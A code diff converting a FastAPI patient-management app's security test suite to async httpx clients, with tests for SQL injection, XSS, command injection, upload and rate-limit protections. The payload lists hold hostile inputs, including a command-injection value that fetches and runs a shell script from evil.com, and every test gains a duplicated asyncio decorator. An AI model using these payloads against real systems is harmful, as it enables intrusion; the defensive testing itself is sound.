@@ -10,8 +10,8 @@ from datetime import datetime, timedelta
 from decimal import Decimal
 from uuid import uuid4
 from fastapi import status
-from fastapi.testclient import TestClient
-from sqlalchemy.orm import Session
+from httpx import AsyncClient
+from sqlalchemy.ext.asyncio import AsyncSession
 
 from app.models.patient import Patient
 from app.models.appointment import Appointment
@@ -39,16 +39,18 @@ class TestSQLInjectionPrevention:
             "' OR EXISTS(SELECT * FROM users) --",
         ]
 
-    def test_patient_name_sql_injection(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_patient_name_sql_injection(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_clinic,
         sql_injection_payloads,
     ):
         """Test SQL injection in patient name fields."""
         for payload in sql_injection_payloads:
-            response = client.post(
+            response = await client.post(
                 "/api/v1/patients/",
                 headers=auth_headers,
                 json={
@@ -74,15 +76,17 @@ class TestSQLInjectionPrevention:
                 data = response.json()
                 assert data["first_name"] == payload
 
-    def test_patient_search_sql_injection(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_patient_search_sql_injection(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         sql_injection_payloads,
     ):
         """Test SQL injection in search queries."""
         for payload in sql_injection_payloads:
-            response = client.get(
+            response = await client.get(
                 "/api/v1/patients/search",
                 headers=auth_headers,
                 params={"q": payload},
@@ -98,15 +102,17 @@ class TestSQLInjectionPrevention:
                 # Should return list (possibly empty), not error
                 assert isinstance(response.json(), list)
 
-    def test_uuid_parameter_sql_injection(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_uuid_parameter_sql_injection(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         sql_injection_payloads,
     ):
         """Test SQL injection in UUID parameters."""
         for payload in sql_injection_payloads:
-            response = client.get(
+            response = await client.get(
                 f"/api/v1/patients/{payload}",
                 headers=auth_headers,
             )
@@ -117,16 +123,18 @@ class TestSQLInjectionPrevention:
                 status.HTTP_422_UNPROCESSABLE_ENTITY,
             ]
 
-    def test_date_parameter_sql_injection(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_date_parameter_sql_injection(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_doctor,
         sql_injection_payloads,
     ):
         """Test SQL injection in date parameters."""
         for payload in sql_injection_payloads:
-            response = client.post(
+            response = await client.post(
                 "/api/v1/appointments/",
                 headers=auth_headers,
                 json={
@@ -143,15 +151,17 @@ class TestSQLInjectionPrevention:
                 status.HTTP_422_UNPROCESSABLE_ENTITY,
             ]
 
-    def test_rag_search_sql_injection(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_rag_search_sql_injection(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         sql_injection_payloads,
     ):
         """Test SQL injection in RAG search queries."""
         for payload in sql_injection_payloads:
-            response = client.get(
+            response = await client.get(
                 "/api/v1/search/",
                 headers=auth_headers,
                 params={"q": payload},
@@ -186,16 +196,18 @@ class TestXSSPrevention:
             "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
         ]
 
-    def test_patient_notes_xss(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_patient_notes_xss(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_clinic,
         xss_payloads,
     ):
         """Test XSS in patient notes field."""
         for payload in xss_payloads:
-            response = client.post(
+            response = await client.post(
                 "/api/v1/patients/",
                 headers=auth_headers,
                 json={
@@ -213,16 +225,18 @@ class TestXSSPrevention:
                 # The payload is stored but should be escaped when rendered in HTML
                 assert data["allergies"] == payload
 
-    def test_appointment_notes_xss(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_appointment_notes_xss(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_appointment,
         xss_payloads,
     ):
         """Test XSS in appointment notes."""
         for payload in xss_payloads:
-            response = client.patch(
+            response = await client.patch(
                 f"/api/v1/appointments/{test_appointment.id}",
                 headers=auth_headers,
                 json={"notes": payload},
@@ -233,15 +247,17 @@ class TestXSSPrevention:
                 # Stored as-is, but must be escaped on frontend rendering
                 assert data["notes"] == payload
 
-    def test_clinic_name_xss(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_clinic_name_xss(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         xss_payloads,
     ):
         """Test XSS in clinic name."""
         for payload in xss_payloads:
-            response = client.post(
+            response = await client.post(
                 "/api/v1/clinics/",
                 headers=auth_headers,
                 json={
@@ -260,15 +276,17 @@ class TestXSSPrevention:
                 data = response.json()
                 assert data["name"] == payload
 
-    def test_search_query_reflected_xss(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_search_query_reflected_xss(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         xss_payloads,
     ):
         """Test reflected XSS in search queries."""
         for payload in xss_payloads:
-            response = client.get(
+            response = await client.get(
                 "/api/v1/search/",
                 headers=auth_headers,
                 params={"q": payload},
@@ -301,9 +319,11 @@ class TestCommandInjection:
             "&& curl http://evil.com/shell.sh | sh",
         ]
 
-    def test_filename_command_injection(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_filename_command_injection(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         command_injection_payloads,
     ):
@@ -318,7 +338,7 @@ class TestCommandInjection:
                 )
             }
 
-            response = client.post(
+            response = await client.post(
                 f"/api/v1/documents/upload?patient_id={uuid4()}",
                 headers=auth_headers,
                 files=files,
@@ -340,9 +360,11 @@ class TestCommandInjection:
 class TestInputValidation:
     """Test input validation rules are enforced."""
 
-    def test_phone_number_validation_invalid_format(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_phone_number_validation_invalid_format(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_clinic,
     ):
@@ -356,7 +378,7 @@ class TestInputValidation:
         ]
 
         for phone in invalid_phones:
-            response = client.post(
+            response = await client.post(
                 "/api/v1/patients/",
                 headers=auth_headers,
                 json={
@@ -368,14 +390,16 @@ class TestInputValidation:
 
             assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
 
-    def test_phone_number_normalization(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_phone_number_normalization(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_clinic,
     ):
         """Test phone number normalization."""
-        response = client.post(
+        response = await client.post(
             "/api/v1/patients/",
             headers=auth_headers,
             json={
@@ -390,9 +414,11 @@ class TestInputValidation:
             # Should be normalized to +91
             assert data["phone"].startswith("+91")
 
-    def test_email_format_validation(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_email_format_validation(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_clinic,
     ):
@@ -407,7 +433,7 @@ class TestInputValidation:
         ]
 
         for email in invalid_emails:
-            response = client.post(
+            response = await client.post(
                 "/api/v1/patients/",
                 headers=auth_headers,
                 json={
@@ -420,9 +446,11 @@ class TestInputValidation:
 
             assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
 
-    def test_uuid_format_validation(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_uuid_format_validation(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
     ):
         """Test UUID format validation."""
@@ -434,16 +462,18 @@ class TestInputValidation:
         ]
 
         for invalid_uuid in invalid_uuids:
-            response = client.get(
+            response = await client.get(
                 f"/api/v1/patients/{invalid_uuid}",
                 headers=auth_headers,
             )
 
             assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
 
-    def test_date_format_validation(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_date_format_validation(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_doctor,
         test_patient,
@@ -458,7 +488,7 @@ class TestInputValidation:
         ]
 
         for invalid_date in invalid_dates:
-            response = client.post(
+            response = await client.post(
                 "/api/v1/appointments/",
                 headers=auth_headers,
                 json={
@@ -471,13 +501,15 @@ class TestInputValidation:
 
             assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
 
-    def test_amount_validation_negative(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_amount_validation_negative(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
     ):
         """Test that negative amounts are rejected."""
-        response = client.post(
+        response = await client.post(
             "/api/v1/payments/",
             headers=auth_headers,
             json={
@@ -494,13 +526,15 @@ class TestInputValidation:
             status.HTTP_404_NOT_FOUND,  # Invoice not found
         ]
 
-    def test_amount_validation_zero(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_amount_validation_zero(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
     ):
         """Test that zero amounts are rejected."""
-        response = client.post(
+        response = await client.post(
             "/api/v1/payments/",
             headers=auth_headers,
             json={
@@ -517,9 +551,11 @@ class TestInputValidation:
             status.HTTP_404_NOT_FOUND,
         ]
 
-    def test_string_length_validation_max(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_string_length_validation_max(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_clinic,
     ):
@@ -527,7 +563,7 @@ class TestInputValidation:
         # Create a very long name (> 100 characters)
         long_name = "A" * 200
 
-        response = client.post(
+        response = await client.post(
             "/api/v1/patients/",
             headers=auth_headers,
             json={
@@ -539,14 +575,16 @@ class TestInputValidation:
 
         assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
 
-    def test_string_length_validation_min(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_string_length_validation_min(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_clinic,
     ):
         """Test minimum string length validation."""
-        response = client.post(
+        response = await client.post(
             "/api/v1/patients/",
             headers=auth_headers,
             json={
@@ -558,13 +596,15 @@ class TestInputValidation:
 
         assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
 
-    def test_required_field_enforcement(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_required_field_enforcement(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
     ):
         """Test that required fields are enforced."""
-        response = client.post(
+        response = await client.post(
             "/api/v1/patients/",
             headers=auth_headers,
             json={
@@ -578,9 +618,11 @@ class TestInputValidation:
         # Should mention missing required fields
         assert any("first_name" in str(err) for err in error_detail)
 
-    def test_gender_enum_validation(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_gender_enum_validation(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_clinic,
     ):
@@ -588,7 +630,7 @@ class TestInputValidation:
         invalid_genders = ["X", "male", "female", "123", "unknown"]
 
         for gender in invalid_genders:
-            response = client.post(
+            response = await client.post(
                 "/api/v1/patients/",
                 headers=auth_headers,
                 json={
@@ -602,9 +644,11 @@ class TestInputValidation:
             # Should reject invalid gender values (only M, F, O allowed)
             assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
 
-    def test_duration_range_validation(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_duration_range_validation(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_doctor,
         test_patient,
@@ -614,7 +658,7 @@ class TestInputValidation:
         invalid_durations = [0, -5, 200, 999]
 
         for duration in invalid_durations:
-            response = client.post(
+            response = await client.post(
                 "/api/v1/appointments/",
                 headers=auth_headers,
                 json={
@@ -627,13 +671,15 @@ class TestInputValidation:
 
             assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
 
-    def test_search_query_min_length(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_search_query_min_length(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
     ):
         """Test search query minimum length validation."""
-        response = client.get(
+        response = await client.get(
             "/api/v1/patients/search",
             headers=auth_headers,
             params={"q": "a"},  # Only 1 character (min is 2)
@@ -649,9 +695,11 @@ class TestInputValidation:
 class TestFileUploadSecurity:
     """Test file upload security measures."""
 
-    def test_reject_executable_files(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_reject_executable_files(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_patient,
     ):
@@ -667,8 +715,8 @@ class TestFileUploadSecurity:
         for filename, content, mime_type in dangerous_extensions:
             files = {"file": (filename, content, mime_type)}
 
-            response = client.post(
-                f"/api/v1/documents/upload?patient_id={test_patient.id}",
+            response = await client.post(
+                f"/api/v1/documents/upload?patient_id={str(test_patient.id)}",
                 headers=auth_headers,
                 files=files,
             )
@@ -679,9 +727,11 @@ class TestFileUploadSecurity:
                 status.HTTP_422_UNPROCESSABLE_ENTITY,
             ]
 
-    def test_file_size_limit(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_file_size_limit(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_patient,
     ):
@@ -693,8 +743,8 @@ class TestFileUploadSecurity:
             "file": ("large_document.pdf", large_content, "application/pdf")
         }
 
-        response = client.post(
-            f"/api/v1/documents/upload?patient_id={test_patient.id}",
+        response = await client.post(
+            f"/api/v1/documents/upload?patient_id={str(test_patient.id)}",
             headers=auth_headers,
             files=files,
         )
@@ -705,9 +755,11 @@ class TestFileUploadSecurity:
             status.HTTP_400_BAD_REQUEST,
         ]
 
-    def test_mime_type_validation(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_mime_type_validation(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_patient,
     ):
@@ -717,8 +769,8 @@ class TestFileUploadSecurity:
             "file": ("document.pdf", b"<html>fake</html>", "text/html")
         }
 
-        response = client.post(
-            f"/api/v1/documents/upload?patient_id={test_patient.id}",
+        response = await client.post(
+            f"/api/v1/documents/upload?patient_id={str(test_patient.id)}",
             headers=auth_headers,
             files=files,
         )
@@ -730,9 +782,11 @@ class TestFileUploadSecurity:
             status.HTTP_404_NOT_FOUND,  # Endpoint might not exist
         ]
 
-    def test_path_traversal_prevention(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_path_traversal_prevention(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_patient,
     ):
@@ -749,8 +803,8 @@ class TestFileUploadSecurity:
                 "file": (filename, b"malicious content", "application/pdf")
             }
 
-            response = client.post(
-                f"/api/v1/documents/upload?patient_id={test_patient.id}",
+            response = await client.post(
+                f"/api/v1/documents/upload?patient_id={str(test_patient.id)}",
                 headers=auth_headers,
                 files=files,
             )
@@ -770,12 +824,14 @@ class TestFileUploadSecurity:
 class TestRateLimiting:
     """Test rate limiting on sensitive endpoints."""
 
-    def test_login_rate_limiting(self, client: TestClient):
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_login_rate_limiting(self, client: AsyncClient):
         """Test rate limiting on login attempts."""
         # Attempt multiple failed logins
         failed_attempts = 0
         for i in range(10):
-            response = client.post(
+            response = await client.post(
                 "/api/v1/auth/login",
                 data={
                     "username": "nonexistent@example.com",
@@ -794,13 +850,15 @@ class TestRateLimiting:
         if failed_attempts > 0:
             assert failed_attempts <= 10
 
-    def test_otp_request_rate_limiting(self, client: TestClient):
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_otp_request_rate_limiting(self, client: AsyncClient):
         """Test rate limiting on OTP requests."""
         phone = "+919876543210"
 
         rate_limited = False
         for i in range(5):
-            response = client.post(
+            response = await client.post(
                 "/api/v1/auth/otp/request",
                 json={"phone": phone},
             )
@@ -813,12 +871,14 @@ class TestRateLimiting:
         # This test documents the requirement
         pass
 
-    def test_password_reset_rate_limiting(self, client: TestClient):
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_password_reset_rate_limiting(self, client: AsyncClient):
         """Test rate limiting on password reset requests."""
         email = "test@example.com"
 
         for i in range(5):
-            response = client.post(
+            response = await client.post(
                 "/api/v1/auth/password-reset/request",
                 json={"email": email},
             )
@@ -830,16 +890,18 @@ class TestRateLimiting:
         # Documents the requirement for rate limiting
         pass
 
-    def test_api_general_rate_limiting(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_api_general_rate_limiting(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
     ):
         """Test general API rate limiting."""
         # Make many requests in quick succession
         responses = []
         for i in range(100):
-            response = client.get(
+            response = await client.get(
                 "/api/v1/patients/",
                 headers=auth_headers,
             )
@@ -860,14 +922,16 @@ class TestRateLimiting:
 class TestParameterPollution:
     """Test protection against HTTP parameter pollution."""
 
-    def test_duplicate_query_parameters(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_duplicate_query_parameters(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
     ):
         """Test handling of duplicate query parameters."""
         # Send duplicate parameters
-        response = client.get(
+        response = await client.get(
             "/api/v1/patients/search?q=test&q=malicious",
             headers=auth_headers,
         )
@@ -878,16 +942,18 @@ class TestParameterPollution:
             status.HTTP_400_BAD_REQUEST,
         ]
 
-    def test_array_parameter_limits(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_array_parameter_limits(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
     ):
         """Test limits on array parameters."""
         # Send excessive array values
         tags = ["tag"] * 1000  # 1000 tags
 
-        response = client.post(
+        response = await client.post(
             "/api/v1/documents/",
             headers=auth_headers,
             json={
@@ -913,14 +979,16 @@ class TestParameterPollution:
 class TestMassAssignmentProtection:
     """Test protection against mass assignment vulnerabilities."""
 
-    def test_cannot_modify_readonly_fields(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_cannot_modify_readonly_fields(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_patient,
     ):
         """Test that readonly fields cannot be modified."""
-        response = client.patch(
+        response = await client.patch(
             f"/api/v1/patients/{test_patient.id}",
             headers=auth_headers,
             json={
@@ -937,15 +1005,17 @@ class TestMassAssignmentProtection:
             assert data["id"] == str(test_patient.id)
             assert data["clinic_id"] == str(test_patient.clinic_id)
 
-    def test_cannot_escalate_privileges(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_cannot_escalate_privileges(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
-        db: Session,
+        db: AsyncSession,
     ):
         """Test that users cannot escalate their own privileges."""
         # Get current user
-        me_response = client.get("/api/v1/auth/me", headers=auth_headers)
+        me_response = await client.get("/api/v1/auth/me", headers=auth_headers)
         if me_response.status_code != status.HTTP_200_OK:
             pytest.skip("Auth endpoint not available")
 
@@ -953,7 +1023,7 @@ class TestMassAssignmentProtection:
         current_role = me_response.json()["role"]
 
         # Try to update own role to admin
-        response = client.patch(
+        response = await client.patch(
             f"/api/v1/users/{user_id}",
             headers=auth_headers,
             json={"role": "admin"},
@@ -974,9 +1044,11 @@ class TestMassAssignmentProtection:
 class TestNullByteInjection:
     """Test protection against null byte injection."""
 
-    def test_null_byte_in_filename(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_null_byte_in_filename(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_patient,
     ):
@@ -992,8 +1064,8 @@ class TestNullByteInjection:
                 "file": (filename, b"content", "application/pdf")
             }
 
-            response = client.post(
-                f"/api/v1/documents/upload?patient_id={test_patient.id}",
+            response = await client.post(
+                f"/api/v1/documents/upload?patient_id={str(test_patient.id)}",
                 headers=auth_headers,
                 files=files,
             )
@@ -1005,14 +1077,16 @@ class TestNullByteInjection:
                 status.HTTP_404_NOT_FOUND,
             ]
 
-    def test_null_byte_in_text_fields(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_null_byte_in_text_fields(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_clinic,
     ):
         """Test null byte injection in text fields."""
-        response = client.post(
+        response = await client.post(
             "/api/v1/patients/",
             headers=auth_headers,
             json={
@@ -1037,15 +1111,17 @@ class TestNullByteInjection:
 class TestIntegerOverflow:
     """Test handling of integer overflow attacks."""
 
-    def test_large_integer_values(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_large_integer_values(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_doctor,
         test_patient,
     ):
         """Test handling of extremely large integer values."""
-        response = client.post(
+        response = await client.post(
             "/api/v1/appointments/",
             headers=auth_headers,
             json={
@@ -1059,13 +1135,15 @@ class TestIntegerOverflow:
         # Should validate and reject unreasonable values
         assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
 
-    def test_negative_integer_in_unsigned_field(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_negative_integer_in_unsigned_field(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
     ):
         """Test negative integers in fields that should be positive."""
-        response = client.get(
+        response = await client.get(
             "/api/v1/patients/",
             headers=auth_headers,
             params={"limit": -1},
@@ -1085,9 +1163,11 @@ class TestIntegerOverflow:
 class TestUnicodeSecurity:
     """Test handling of Unicode-based attacks."""
 
-    def test_unicode_normalization(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_unicode_normalization(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_clinic,
     ):
@@ -1100,7 +1180,7 @@ class TestUnicodeSecurity:
         ]
 
         for name in names:
-            response = client.post(
+            response = await client.post(
                 "/api/v1/patients/",
                 headers=auth_headers,
                 json={
@@ -1116,9 +1196,11 @@ class TestUnicodeSecurity:
                 status.HTTP_400_BAD_REQUEST,
             ]
 
-    def test_rtl_override_attacks(
+    @pytest.mark.asyncio
+    @pytest.mark.asyncio
+    async def test_rtl_override_attacks(
         self,
-        client: TestClient,
+        client: AsyncClient,
         auth_headers: dict,
         test_clinic,
     ):
@@ -1126,7 +1208,7 @@ class TestUnicodeSecurity:
         # RTL override can be used to disguise file extensions
         malicious_name = "document\u202Efdp.exe"  # Appears as "documentexe.pdf"
 
-        response = client.post(
+        response = await client.post(
             "/api/v1/patients/",
             headers=auth_headers,
             json={
